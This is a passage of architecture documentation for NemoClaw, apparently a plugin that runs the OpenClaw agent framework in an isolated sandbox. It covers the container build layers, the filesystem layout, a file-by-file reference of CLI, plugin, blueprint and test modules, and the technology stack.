|  Layer 6: NemoClaw Plugin                              |
|  COPY nemoclaw/dist/ nemoclaw/openclaw.plugin.json     |
|  npm install --omit=dev                                |
+-------------------------------------------------------+
|  Layer 7: Blueprint                                    |
|  COPY nemoclaw-blueprint/ to cache                     |
+-------------------------------------------------------+
|  Layer 8: Startup Script                               |
|  COPY scripts/nemoclaw-start.sh                        |
+-------------------------------------------------------+
|  Layer 9: OpenClaw Configuration                       |
|  Write openclaw.json with nvidia provider              |
|  Install NemoClaw plugin                               |
+-------------------------------------------------------+
|  USER sandbox                                          |
|  ENTRYPOINT ["/bin/bash"]                              |
+-------------------------------------------------------+
```

### Sandbox Filesystem Layout

```
/sandbox/                        # Home directory (read-write)
    +-- .openclaw/               # OpenClaw state
    |   +-- openclaw.json        # Agent configuration
    |   +-- agents/              # Agent definitions
    +-- .nemoclaw/               # NemoClaw state
    |   +-- blueprints/          # Cached blueprints
    |   +-- migration/           # Migration archives (temporary)
    +-- workspaces/              # Migrated workspaces

/opt/nemoclaw/                   # Plugin installation (read-only)
    +-- dist/                    # Compiled TypeScript
    +-- openclaw.plugin.json
    +-- package.json
    +-- node_modules/

/opt/nemoclaw-blueprint/         # Blueprint files (read-only)
    +-- blueprint.yaml
    +-- orchestrator/
    +-- policies/
```

---

## 12. File-by-File Reference

### Host CLI Files

| File | Purpose | Key Functions |
|---|---|---|
| `bin/nemoclaw.js` | CLI entry point, command dispatcher | `onboard()`, `deploy()`, `sandboxConnect()`, `sandboxDestroy()` |
| `bin/lib/runner.js` | Shell execution helpers | `run(cmd)`, `runCapture(cmd)` |
| `bin/lib/registry.js` | Sandbox metadata CRUD | `registerSandbox()`, `getSandbox()`, `listSandboxes()`, `removeSandbox()` |
| `bin/lib/credentials.js` | Secure credential storage | `ensureApiKey()`, `getCredential()`, `prompt()` |
| `bin/lib/onboard.js` | 7-step setup wizard | `preflight()`, `startGateway()`, `createSandbox()`, `setupNim()`, `setupInference()`, `setupPolicies()` |
| `bin/lib/nim.js` | NIM container lifecycle | `detectGpu()`, `listModels()`, `pullNimImage()`, `startNimContainer()`, `nimStatus()` |
| `bin/lib/policies.js` | Network policy presets | `listPresets()`, `getAppliedPresets()`, `applyPreset()` |
| `bin/lib/preflight.js` | System validation | `checkCgroupConfig()` |

### Plugin Source Files

| File | Purpose | Key Exports |
|---|---|---|
| `nemoclaw/src/index.ts` | Plugin registration entry point | `register()`, `getPluginConfig()`, type definitions |
| `nemoclaw/src/cli.ts` | Commander.js subcommand wiring | `registerCliCommands()` |
| `nemoclaw/src/commands/launch.ts` | Fresh bootstrap into OpenShell | `cliLaunch()` |
| `nemoclaw/src/commands/migrate.ts` | Host-to-sandbox migration | `cliMigrate()`, `detectHostOpenClaw()` |
| `nemoclaw/src/commands/connect.ts` | Interactive shell access | `cliConnect()` |
| `nemoclaw/src/commands/status.ts` | Health + state reporting | `cliStatus()` |
| `nemoclaw/src/commands/logs.ts` | Log streaming | `cliLogs()` |
| `nemoclaw/src/commands/eject.ts` | Rollback to host | `cliEject()` |
| `nemoclaw/src/commands/onboard.ts` | Inference config wizard | `cliOnboard()` |
| `nemoclaw/src/commands/slash.ts` | /nemoclaw chat command | `handleSlashCommand()` |
| `nemoclaw/src/commands/migration-state.ts` | Snapshot/restore logic | `createSnapshotBundle()`, `restoreSnapshotToHost()`, `detectHostOpenClaw()` |
| `nemoclaw/src/blueprint/resolve.ts` | Version resolution + caching | `resolveBlueprint()`, `isCached()`, `readCachedManifest()` |
| `nemoclaw/src/blueprint/fetch.ts` | OCI registry download | `fetchBlueprint()` |
| `nemoclaw/src/blueprint/verify.ts` | Digest + compatibility checks | `verifyBlueprintDigest()`, `checkCompatibility()` |
| `nemoclaw/src/blueprint/exec.ts` | Blueprint runner subprocess | `execBlueprint()` |
| `nemoclaw/src/blueprint/state.ts` | Persistent run state | `loadState()`, `saveState()`, `clearState()` |
| `nemoclaw/src/onboard/config.ts` | Inference config persistence | `loadOnboardConfig()`, `saveOnboardConfig()` |
| `nemoclaw/src/onboard/prompt.ts` | Interactive prompts | `askEndpointType()`, `askModel()` |
| `nemoclaw/src/onboard/validate.ts` | Input validation | `validateApiKey()`, `validateEndpointUrl()` |

### Blueprint Files

| File | Purpose |
|---|---|
| `nemoclaw-blueprint/blueprint.yaml` | Version metadata, profiles, component config |
| `nemoclaw-blueprint/orchestrator/runner.py` | Plan/apply/status/rollback actions |
| `nemoclaw-blueprint/policies/openclaw-sandbox.yaml` | Base security policy |
| `nemoclaw-blueprint/policies/presets/*.yaml` | Service-specific network allowlists |
| `nemoclaw-blueprint/migrations/snapshot.py` | Migration state handling |

### Test Files

| File | Tests |
|---|---|
| `test/cli.test.js` | CLI dispatcher logic |
| `test/registry.test.js` | Sandbox registry CRUD |
| `test/credentials.test.js` | Credential storage/retrieval |
| `test/policies.test.js` | Policy preset application |
| `test/preflight.test.js` | System checks |
| `test/nim.test.js` | NIM container detection |

---

## Appendix: Technology Stack

| Layer | Technology | Version | Purpose |
|---|---|---|---|
| Host CLI | Node.js | 20+ | Runtime |
| Host CLI | CommonJS | - | Module format |
| Plugin | TypeScript | 5.4+ | Language |
| Plugin | ESM | - | Module format |
| Plugin | Commander.js | 13.1+ | CLI parsing |
| Blueprint | Python | 3.11+ | Orchestration |
| Blueprint | PyYAML | - | Config parsing |
| Container | Docker | 20.10+ | Runtime |
| Container | Node 22-slim | - | Base image |
| Security | Landlock | - | FS isolation |
| Security | seccomp | - | Syscall filtering |
| Security | Network NS | - | Network isolation |
| Runtime | OpenShell | 0.1.0+ | Secure agent runtime |
| Runtime | OpenClaw | 2026.3.11+ | AI agent framework |
| Inference | NVIDIA NIM | - | Model serving |
| Testing | Node test runner | - | Native test framework |
| Linting | ESLint | 9.39+ | Code quality |
| Formatting | Prettier | 3.8+ | Code style |
